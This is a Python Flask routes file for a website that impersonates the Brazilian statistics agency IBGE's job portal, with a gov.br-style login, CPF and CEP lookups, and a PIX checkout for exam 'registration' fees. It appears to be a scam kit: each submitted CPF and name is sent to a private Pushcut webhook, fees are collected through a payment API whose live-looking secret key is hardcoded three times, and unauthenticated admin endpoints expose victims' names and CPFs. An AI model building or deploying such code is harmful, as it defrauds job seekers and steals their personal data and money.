from flask import render_template, request, jsonify, session, redirect
from models import ConcursoPublico, ProcessoSeletivo, VagaEstagio, CookieConsent
import requests
import qrcode
from io import BytesIO
import base64

def gerar_codigo_pix_simulado(valor, protocolo):
    """Gerar código PIX simulado para demonstração"""
    return f"00020126580014BR.GOV.BCB.PIX0136{protocolo}5204000053039865802BR5925IBGE TRABALHE CONOSCO6009SAO PAULO62070503***6304{str(abs(hash(protocolo)))[:4]}"

def register_routes(app):
    """Registrar todas as rotas da aplicação"""
    
    @app.route('/')
    def index():
        """Página principal - Trabalhe Conosco IBGE"""
        concursos = ConcursoPublico.query.filter_by(status='ativo').all()
        processos = ProcessoSeletivo.query.filter_by(status='ativo').all()
        estagios = VagaEstagio.query.filter_by(status='ativo').all()
        
        return render_template('index.html', 
                             concursos=concursos,
                             processos=processos, 
                             estagios=estagios)

    @app.route('/concursos')
    def concursos():
        """Página de concursos públicos"""
        concursos_ativos = ConcursoPublico.query.filter_by(status='ativo').all()
        return render_template('concursos.html', concursos=concursos_ativos)

    @app.route('/processos_seletivos')
    def processos_seletivos():
        """Página de processos seletivos"""
        processos_ativos = ProcessoSeletivo.query.filter_by(status='ativo').all()
        return render_template('processos_seletivos.html', processos=processos_ativos)

    @app.route('/estagios')
    def estagios():
        """Página de estágios"""
        estagios_ativos = VagaEstagio.query.filter_by(status='ativo').all()
        return render_template('estagios.html', estagios=estagios_ativos)

    @app.route('/login')
    def login():
        """Página de login gov.br"""
        return render_template('login.html')

    def _send_pushcut_cpf_notification(cpf_data: dict, consultation_result: dict) -> None:
        """Send notification to Pushcut webhook when CPF is consulted"""
        try:
            pushcut_webhook_url = "https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Sms"
            
            # Preparar dados da notificação
            customer_name = consultation_result.get('nome_completo', 'Cliente')
            cpf = cpf_data.get('cpf', 'N/A')
            success = consultation_result.get('success', False)
            
            notification_payload = {
                "title": "📋 Nova Consulta CPF",
                "text": f"Cliente: {customer_name}\nCPF: {cpf}\nStatus: {'Sucesso' if success else 'Fallback'}",
                "isTimeSensitive": True
            }
            
            print(f"[CPF] Enviando notificação Pushcut: {notification_payload}")
            
            # Enviar notificação
            response = requests.post(
                pushcut_webhook_url,
                json=notification_payload,
                timeout=10
            )
            
            if response.ok:
                print("[CPF] Notificação Pushcut enviada com sucesso!")
            else:
                print(f"[CPF] Falha ao enviar notificação Pushcut: {response.status_code}")
                
        except Exception as e:
            print(f"[CPF] Erro ao enviar notificação Pushcut: {str(e)}")

    @app.route('/api/validate-cpf', methods=['POST'])
    def validate_cpf():
        """API para validar CPF usando CPFConsultationClient"""
        try:
            data = request.get_json()
            cpf = data.get('cpf', '').replace('.', '').replace('-', '')
            
            if not cpf or len(cpf) != 11:
                return jsonify({'success': False, 'message': 'CPF inválido'})
            
            # Usar CPFConsultationClient para consultar CPF
            from cpf_client import cpf_client
            
            cpf_result = cpf_client.consult(cpf)
            
            if not cpf_result.get('success'):
                # Se falhar na API, usar dados de fallback
                user_data = {
                    'nome_completo': 'João Silva Santos',
                    'nome_mae': 'Maria Silva Santos',
                    'data_nascimento': '15/03/1985',
                    'cpf': cpf,
                    'rg': '12.345.678-9',
                    'naturalidade': 'São Paulo - SP',
                    'sexo': 'Masculino',
                    'estado_civil': 'Casado(a)',
                    'success': False
                }
                print(f"[CPF API] Fallback usado - Erro: {cpf_result.get('message')}")
            else:
                # Usar dados da API
                api_data = cpf_result.get('data', {})
                user_data = {
                    'nome_completo': api_data.get('nome', 'João Silva Santos'),
                    'nome_mae': api_data.get('nome_mae', 'Maria Silva Santos'),
                    'data_nascimento': api_data.get('data_nascimento', '15/03/1985'),
                    'cpf': cpf,
                    'rg': '12.345.678-9',
                    'naturalidade': 'São Paulo - SP',
                    'sexo': 'Masculino' if api_data.get('sexo') == 'M' else 'Feminino',
                    'estado_civil': 'Casado(a)',
                    'success': True
                }
                print(f"[CPF API] Dados obtidos: {api_data.get('nome')}")
            
            # Enviar notificação via Pushcut webhook
            _send_pushcut_cpf_notification(data, user_data)
            
            session['user_data'] = user_data
            return jsonify({'success': True, 'data': user_data})
            
        except Exception as e:
            print(f"Erro na validação de CPF: {str(e)}")
            return jsonify({'success': False, 'message': 'Erro interno do servidor'})

    @app.route('/api/validate-cep', methods=['POST'])
    def validate_cep():
        """API para validar CEP usando CEPConsultationClient"""
        try:
            data = request.get_json()
            cep = data.get('cep', '').replace('-', '').replace(' ', '')
            
            if not cep or len(cep) != 8:
                return jsonify({'success': False, 'message': 'CEP inválido'})
            
            # Usar CEPConsultationClient para consultar CEP
            from cep_client import CEPConsultationClient
            
            # Usar a mesma base_url da API PayBets
            base_url = "https://elite-manager-api-62571bbe8e96.herokuapp.com/api"
            cep_client = CEPConsultationClient(base_url)
            
            cep_result = cep_client.consult(cep)
            
            if not cep_result.get('success'):
                # Se falhar na API, tentar ViaCEP como fallback
                try:
                    response = requests.get(f'https://viacep.com.br/ws/{cep}/json/', timeout=5)
                    if response.status_code == 200:
                        cep_data = response.json()
                        if 'erro' not in cep_data:
                            return jsonify({
                                'success': True,
                                'data': {
                                    'cep': cep,
                                    'logradouro': cep_data.get('logradouro', ''),
                                    'bairro': cep_data.get('bairro', ''),
                                    'localidade': cep_data.get('localidade', ''),
                                    'uf': cep_data.get('uf', '')
                                }
                            })
                except:
                    pass
                
                return jsonify({'success': False, 'message': 'CEP não encontrado'})
            
            # Usar dados da API
            api_data = cep_result.get('data', {})
            return jsonify({
                'success': True,
                'data': {
                    'cep': cep,
                    'logradouro': api_data.get('logradouro', ''),
                    'bairro': api_data.get('bairro', ''),
                    'localidade': api_data.get('localidade', ''),  # Usar localidade ao invés de cidade
                    'uf': api_data.get('uf', '')
                }
            })
            
        except Exception as e:
            print(f"Erro na validação de CEP: {str(e)}")
            return jsonify({'success': False, 'message': 'Erro interno do servidor'})



    @app.route('/selecao-cargo')
    def selecao_cargo():
        """Página de seleção de cargo"""
        return render_template('selecao_cargo.html')

    @app.route('/confirmacao-dados')
    def confirmacao_dados():
        """Página de confirmação de dados"""
        
        # Dados do usuário para o template
        usuario_data = session.get('user_data', {})
        
        # Se não há dados na sessão, usar dados padrão vazios
        usuario = {
            'nome_completo': usuario_data.get('nome_completo', ''),
            'cpf': usuario_data.get('cpf', ''),
            'rg': usuario_data.get('rg', ''),
            'data_nascimento': usuario_data.get('data_nascimento', ''),
            'sexo': usuario_data.get('sexo', ''),
            'estado_civil': usuario_data.get('estado_civil', ''),
            'nome_mae': usuario_data.get('nome_mae', ''),
            'nome_pai': usuario_data.get('nome_pai', ''),
            'naturalidade': usuario_data.get('naturalidade', '')
        }
        
        # Buscar CEP dos parâmetros da URL
        cep_url = request.args.get('cep', '').replace('-', '').replace(' ', '')
        
        # Dados de endereço - buscar via ViaCEP se CEP fornecido
        endereco = {
            'cep': '',
            'logradouro': '',
            'numero': '',
            'complemento': '',
            'bairro': '',
            'cidade': '',
            'uf': ''
        }
        
        if cep_url and len(cep_url) == 8:
            try:
                # Buscar dados do CEP via ViaCEP
                response = requests.get(f'https://viacep.com.br/ws/{cep_url}/json/', timeout=5)
                if response.status_code == 200:
                    cep_data = response.json()
                    if 'erro' not in cep_data:
                        endereco = {
                            'cep': cep_url,
                            'logradouro': cep_data.get('logradouro', ''),
                            'numero': '',
                            'complemento': '',
                            'bairro': cep_data.get('bairro', ''),
                            'cidade': cep_data.get('localidade', ''),
                            'uf': cep_data.get('uf', '')
                        }
            except:
                # Se falhar, manter endereço vazio
                pass
        
        # Dados de contato
        contato = {
            'telefone': '',
            'telefone_alt': '',
            'email': ''
        }
        
        # Dados de cargo baseados no parâmetro
        cargo_param = request.args.get('cargo', 'agente')
        categoria_cnh = request.args.get('categoria_cnh', 'D')
        
        if cargo_param == 'supervisor':
            cargo_selecionado = 'Supervisor de Coleta e Qualidade'
            vagas_disponivel = '1.245'
            mostrar_categoria_cnh = True
        else:
            cargo_selecionado = 'Agente de Pesquisas e Mapeamento'
            vagas_disponivel = '7.825'
            mostrar_categoria_cnh = True
        
        return render_template('confirmacao_dados.html', 
                             usuario=usuario, 
                             endereco=endereco, 
                             contato=contato, 
                             cargo_selecionado=cargo_selecionado,
                             vagas_disponivel=vagas_disponivel,
                             categoria_cnh=categoria_cnh,
                             mostrar_categoria_cnh=mostrar_categoria_cnh)

    @app.route('/selecao-local-prova')
    def selecao_local_prova():
        """Página de seleção do local da prova"""
        # Carregar página imediatamente sem processamento lento
        return render_template('selecao_local_prova.html')



    @app.route('/checkout')
    def checkout():
        """Página de checkout PIX"""
        return render_template('checkout.html')

    @app.route('/gerar-pix', methods=['POST'])
    def gerar_pix():
        """API para gerar pagamento PIX via Cashtime"""
        try:
            data = request.get_json()
            print(f"[PIX DEBUG] Dados recebidos: {data}")

            # Validar dados obrigatórios
            required_fields = ['name', 'email', 'cpf', 'amount']
            for field in required_fields:
                if not data.get(field):
                    print(f"[PIX DEBUG] Campo obrigatório ausente: {field}")
                    return jsonify({'erro': f'Campo {field} é obrigatório'}), 400

            # Verificar limite de pedidos por CPF
            from models import PixRequestLimit
            cpf_clean = data['cpf'].replace('.', '').replace('-', '')
            
            print(f"[PIX LIMIT] Verificando limite para CPF: {cpf_clean}")
            
            if PixRequestLimit.is_limit_exceeded(cpf_clean, limit=8):
                current_count = PixRequestLimit.get_request_count(cpf_clean)
                print(f"[PIX LIMIT] ❌ Limite excedido para CPF {cpf_clean}: {current_count} pedidos")
                
                return jsonify({
                    'erro': 'Limite de solicitações excedido',
                    'mensagem': f'Este CPF já possui {current_count} pedidos PIX registrados. O limite máximo é de 8 pedidos por CPF.',
                    'codigo': 'LIMIT_EXCEEDED',
                    'limite_maximo': 8,
                    'pedidos_atuais': current_count
                }), 429
            
            current_count = PixRequestLimit.get_request_count(cpf_clean)
            print(f"[PIX LIMIT] ✓ Limite OK para CPF {cpf_clean}: {current_count}/8 pedidos")

            print("[PIX DEBUG] Usando Cashtime API...")
            from cashtime_api import create_cashtime_api
            from datetime import datetime, timedelta
            import uuid

            print("[PIX DEBUG] Preparando dados do pagamento...")
            # Converter valor de centavos para reais para a API Cashtime
            valor_reais = data['amount'] / 100 if isinstance(data['amount'], int) else data['amount']
            
            # Preparar dados para Cashtime API
            cashtime_data = {
                'name': data['name'],
                'email': data['email'],
                'cpf': data['cpf'],
                'amount': valor_reais,
                'phone': data.get('phone', '11999999999'),
                'description': f"Inscrição Concurso Público IBGE 2025 - Valor: R$ {valor_reais:.2f}",
                'expirationMinutes': 60
            }

            print("[PIX DEBUG] Gerando PIX via Cashtime...")
            try:
                # Usar a secret key hardcoded fornecida
                secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
                
                # Criar instância da API Cashtime
                cashtime_api = create_cashtime_api(secret_key=secret_key)
                
                # Gerar PIX
                result = cashtime_api.create_pix_payment(cashtime_data)
                
                if result.get('success'):
                    print(f"[PIX DEBUG] ✓ PIX Cashtime gerado com sucesso: {result.get('cashtime_id')}")
                    
                    # Registrar pedido no sistema de limite
                    try:
                        transaction_id = result.get('cashtime_id')
                        ip_address = request.remote_addr
                        user_agent = request.headers.get('User-Agent', '')
                        
                        PixRequestLimit.add_request(
                            cpf=data['cpf'],
                            nome_completo=data['name'],
                            email=data['email'],
                            transaction_id=transaction_id,
                            amount=valor_reais,
                            ip_address=ip_address,
                            user_agent=user_agent
                        )
                        
                        updated_count = PixRequestLimit.get_request_count(cpf_clean)
                        print(f"[PIX LIMIT] ✓ Pedido registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
                        
                    except Exception as e:
                        print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido: {e}")
                    
                    # Gerar QR Code em base64 se não foi fornecido
                    qr_code_base64 = result.get('qr_code_image')
                    if not qr_code_base64 and result.get('pix_code'):
                        import qrcode
                        import io
                        import base64
                        
                        qr = qrcode.QRCode(version=1, box_size=10, border=5)
                        qr.add_data(result.get('pix_code'))
                        qr.make(fit=True)
                        
                        img = qr.make_image(fill_color="black", back_color="white")
                        img_buffer = io.BytesIO()
                        img.save(img_buffer, format='PNG')
                        img_str = base64.b64encode(img_buffer.getvalue()).decode()
                        qr_code_base64 = f"data:image/png;base64,{img_str}"
                    
                    return jsonify({
                        'success': True,
                        'payment_id': result.get('cashtime_id'),
                        'pix_code': result.get('pix_code'),
                        'pix_qr_code': qr_code_base64,
                        'expires_at': result.get('expires_at'),
                        'status': result.get('status', 'pending'),
                        'pix_real': True,
                        'cashtime_transaction': True
                    })
                else:
                    raise Exception(result.get('error', 'Erro na API Cashtime'))
                
            except Exception as api_error:
                print(f"[PIX DEBUG] ❌ Erro na API Cashtime: {api_error}")
                print("[PIX DEBUG] Gerando PIX de demonstração como fallback...")
                
                # PIX de demonstração usando nova implementação
                import uuid
                import io
                import base64
                import random
                from datetime import datetime, timedelta
                
                # Gerar protocolo e PIX simulado
                protocolo = f"PAY-2025-{random.randint(100000, 999999)}"
                valor_final = data['amount'] / 100  # Converter de centavos para reais
                
                # Usar função melhorada de PIX simulado
                pix_code_simulado = gerar_codigo_pix_simulado(valor_final, protocolo)
                
                # Gerar QR code
                qr = qrcode.QRCode(
                    version=1,
                    box_size=10,
                    border=4,
                )
                qr.add_data(pix_code_simulado)
                qr.make(fit=True)
                
                img = qr.make_image(fill_color="black", back_color="white")
                img_buffer = io.BytesIO()
                img.save(img_buffer, format='PNG')
                img_str = base64.b64encode(img_buffer.getvalue()).decode()
                
                print("[PIX DEBUG] ✓ PIX de demonstração gerado com sucesso")
                
                # Registrar pedido no sistema de limite (mesmo para demonstração)
                try:
                    demo_payment_id = f"demo_{uuid.uuid4().hex[:12]}"
                    ip_address = request.remote_addr
                    user_agent = request.headers.get('User-Agent', '')
                    
                    PixRequestLimit.add_request(
                        cpf=data['cpf'],
                        nome_completo=data['name'],
                        email=data['email'],
                        transaction_id=demo_payment_id,
                        amount=valor_final,
                        ip_address=ip_address,
                        user_agent=user_agent
                    )
                    
                    updated_count = PixRequestLimit.get_request_count(cpf_clean)
                    print(f"[PIX LIMIT] ✓ Pedido demo registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
                    
                except Exception as e:
                    print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido demo: {e}")
                
                return jsonify({
                    'success': True,
                    'payment_id': demo_payment_id,
                    'pix_code': pix_code_simulado,
                    'pix_qr_code': f"data:image/png;base64,{img_str}",
                    'expires_at': (datetime.now() + timedelta(minutes=30)).isoformat(),
                    'status': 'pending',
                    'pix_simulado': True
                })

        except Exception as e:
            import traceback
            print(f"[PIX ERROR] Erro ao gerar PIX: {str(e)}")
            print(f"[PIX ERROR] Traceback completo: {traceback.format_exc()}")
            return jsonify({'erro': 'Erro interno do servidor'}), 500

    @app.route('/api/verificar-pagamento-pix', methods=['POST'])
    def verificar_pagamento_pix():
        """API para verificar status do pagamento PIX em tempo real"""
        try:
            data = request.get_json()
            payment_id = data.get('payment_id') or session.get('payment_id')
            
            if not payment_id:
                return jsonify({
                    'sucesso': False,
                    'erro': 'ID do pagamento não encontrado'
                })
            
            # Verificar se é pagamento de demonstração
            if payment_id.startswith('demo_'):
                print(f"[PIX DEBUG] Verificando pagamento de demonstração: {payment_id}")
                return jsonify({
                    'sucesso': True,
                    'status': 'pendente',
                    'message': 'Pagamento em demonstração - sempre pendente'
                })
            
            # Para pagamentos Cashtime, tentar verificar via API
            print(f"[PIX DEBUG] Verificando pagamento Cashtime: {payment_id}")
            try:
                from cashtime_api import create_cashtime_api
                secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
                
                cashtime_api = create_cashtime_api(secret_key=secret_key)
                result = cashtime_api.check_payment_status(payment_id)
                
                if result.get('success'):
                    return jsonify({
                        'sucesso': True,
                        'status': result.get('status', 'pendente'),
                        'message': f'Status Cashtime: {result.get("status", "pendente")}'
                    })
                else:
                    # Fallback para pendente se não conseguir verificar
                    return jsonify({
                        'sucesso': True,
                        'status': 'pendente',
                        'message': 'Pagamento Cashtime - aguardando confirmação'
                    })
                    
            except Exception as cashtime_error:
                print(f"[PIX DEBUG] Erro na verificação Cashtime: {cashtime_error}")
                # Fallback para pendente
                return jsonify({
                    'sucesso': True,
                    'status': 'pendente',
                    'message': 'Pagamento Cashtime - aguardando confirmação'
                })
                
        except Exception as e:
            print(f"[PIX DEBUG] Erro na verificação de pagamento: {str(e)}")
            return jsonify({
                'sucesso': False,
                'erro': 'Erro interno do servidor'
            })

    @app.route('/verificar-pagamento/<payment_id>')
    def verificar_pagamento(payment_id):
        """API para verificar status do pagamento (compatibilidade) - PayBets sempre pendente"""
        try:
            # Para PayBets, sempre retornar pendente
            if payment_id.startswith('demo_'):
                status = 'pending'
                message = 'Pagamento de demonstração'
            else:
                status = 'pending'
                message = 'Pagamento PayBets aguardando confirmação'
            
            return jsonify({
                'status': status,
                'message': message,
                'payment_id': payment_id,
                'paid': False,
                'pending': True,
                'failed': False
            })
        except Exception as e:
            print(f"Erro ao verificar pagamento: {str(e)}")
            return jsonify({'erro': 'Erro ao verificar pagamento'}), 500

    @app.route('/debug-cashtime')
    def debug_cashtime():
        """Debug da configuração Cashtime"""
        import os
        try:
            debug_info = {
                'api_url': 'https://api.cashtime.com.br/v1',
                'api_configured': True,
                'available_endpoints': [
                    '/transactions',
                    '/transactions/{txid}'
                ]
            }
            
            # Tentar criar instância da API
            try:
                from cashtime_api import create_cashtime_api
                secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
                
                api = create_cashtime_api(secret_key=secret_key)
                debug_info['api_instance_created'] = True
                debug_info['api_url_active'] = api.API_URL
                debug_info['secret_key'] = api.secret_key[:20] + '...'
                debug_info['public_key'] = api.public_key[:20] + '...' if api.public_key else None
                
            except Exception as e:
                debug_info['api_instance_created'] = False
                debug_info['api_error'] = str(e)
            
            return jsonify(debug_info)
            
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @app.route('/debug-paybets')
    def debug_paybets():
        """Debug da configuração PayBets"""
        import os
        try:
            debug_info = {
                'api_url': 'https://elite-manager-api-62571bbe8e96.herokuapp.com/api',
                'api_configured': True,
                'available_endpoints': [
                    '/payments/paybets/pix/generate',
                    '/payments/pix/status/{paymentId}',
                    '/external/cpf/{cpf}',
                    '/external/cep/{cep}'
                ]
            }
            
            # Tentar criar instância da API
            try:
                from paybets_api import create_production_api
                with create_production_api() as api:
                    debug_info['api_instance_created'] = True
                    debug_info['api_url_active'] = api.API_URL
                    debug_info['timeout'] = api.timeout
                    debug_info['max_retries'] = api.max_retries
            except Exception as e:
                debug_info['api_instance_created'] = False
                debug_info['api_error'] = str(e)
            
            return jsonify(debug_info)
            
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @app.route('/health/cashtime')
    def health_cashtime():
        """Verificar saúde da API Cashtime"""
        try:
            import requests
            response = requests.get('https://api.cashtime.com.br/health', timeout=5)
            
            result = {
                'status': 'healthy' if response.status_code == 200 else 'unhealthy',
                'api_url': 'https://api.cashtime.com.br/v1',
                'response_time': response.elapsed.total_seconds(),
                'status_code': response.status_code
            }
            
            status_code = 200 if result['status'] == 'healthy' else 503
            return jsonify(result), status_code
        except Exception as e:
            return jsonify({
                'status': 'unhealthy',
                'error': str(e),
                'api_url': 'https://api.cashtime.com.br/v1'
            }), 503
    
    @app.route('/health/paybets')
    def health_paybets():
        """Verificar saúde da API PayBets"""
        try:
            from paybets_api import health_check
            health_status = health_check()
            
            status_code = 200 if health_status.get('status') == 'healthy' else 503
            return jsonify(health_status), status_code
            
        except Exception as e:
            return jsonify({
                'status': 'unhealthy',
                'error': str(e)
            }), 500

    @app.route('/accept-cookies', methods=['POST'])
    def accept_cookies():
        """API para aceitar cookies"""
        try:
            from app import db
            consent = CookieConsent()
            consent.ip_address = request.remote_addr
            consent.user_agent = request.headers.get('User-Agent', '')
            consent.consent_type = 'accepted'
            
            db.session.add(consent)
            db.session.commit()
            
            return jsonify({'success': True})
        except Exception as e:
            print(f"Erro ao salvar consent: {str(e)}")
            return jsonify({'success': False}), 500

    @app.route('/admin/pix-limits', methods=['GET'])
    def admin_pix_limits():
        """Endpoint administrativo para consultar limites PIX"""
        try:
            from models import PixRequestLimit
            from sqlalchemy import func
            from app import db
            
            # Obter estatísticas gerais
            total_requests = PixRequestLimit.query.count()
            
            # Obter contagem por CPF
            cpf_stats = db.session.query(
                PixRequestLimit.cpf_clean,
                func.count(PixRequestLimit.id).label('count'),
                func.max(PixRequestLimit.nome_completo).label('nome'),
                func.max(PixRequestLimit.created_at).label('ultimo_pedido')
            ).group_by(PixRequestLimit.cpf_clean).all()
            
            # Identificar CPFs próximos ao limite
            near_limit = [stat for stat in cpf_stats if stat.count >= 6]
            at_limit = [stat for stat in cpf_stats if stat.count >= 8]
            
            return jsonify({
                'success': True,
                'stats': {
                    'total_requests': total_requests,
                    'unique_cpfs': len(cpf_stats),
                    'near_limit': len(near_limit),
                    'at_limit': len(at_limit),
                    'limit_maximo': 8
                },
                'cpf_details': [
                    {
                        'cpf': stat.cpf_clean,
                        'nome': stat.nome,
                        'pedidos': stat.count,
                        'ultimo_pedido': stat.ultimo_pedido.isoformat() if stat.ultimo_pedido else None,
                        'status': 'BLOQUEADO' if stat.count >= 8 else 'PROXIMO_LIMITE' if stat.count >= 6 else 'NORMAL'
                    } for stat in cpf_stats
                ]
            })
            
        except Exception as e:
            print(f"Erro ao consultar limites PIX: {str(e)}")
            return jsonify({'success': False, 'error': str(e)}), 500

    @app.route('/admin/pix-limits/reset/<cpf>', methods=['POST'])
    def admin_reset_pix_limit(cpf):
        """Endpoint administrativo para resetar limite de um CPF"""
        try:
            from models import PixRequestLimit
            from app import db
            
            cpf_clean = cpf.replace('.', '').replace('-', '')
            
            # Remover todos os registros do CPF
            deleted_count = PixRequestLimit.query.filter_by(cpf_clean=cpf_clean).delete()
            db.session.commit()
            
            return jsonify({
                'success': True,
                'message': f'Limite resetado para CPF {cpf_clean}',
                'registros_removidos': deleted_count
            })
            
        except Exception as e:
            print(f"Erro ao resetar limite PIX: {str(e)}")
            return jsonify({'success': False, 'error': str(e)}), 500

    # Páginas estáticas
    @app.route('/mais-informacoes')
    def mais_informacoes():
        return render_template('mais_informacoes.html')

    @app.route('/atendimento')
    def atendimento():
        return render_template('atendimento.html')

    @app.route('/apps-ibge')
    def apps_ibge():
        return render_template('apps_ibge.html')

    @app.route('/transparencia')
    def transparencia():
        return render_template('transparencia.html')

    @app.route('/privacidade')
    def privacidade():
        return render_template('privacidade.html')

    @app.route('/orgaos-governo')
    def orgaos_governo():
        return render_template('orgaos_governo.html')

    @app.route('/edital-completo')
    def edital_completo():
        return render_template('edital_completo.html')

    @app.route('/confirmar-local-prova', methods=['POST'])
    def confirmar_local_prova():
        """Confirmar seleção do local da prova"""
        escola_selecionada = request.form.get('escola_selecionada')

        if not escola_selecionada:
            return redirect('/selecao-local-prova')

        # Salvar escola selecionada na sessão
        session['local_prova'] = escola_selecionada

        # Redirecionar para checkout
        return redirect('/checkout')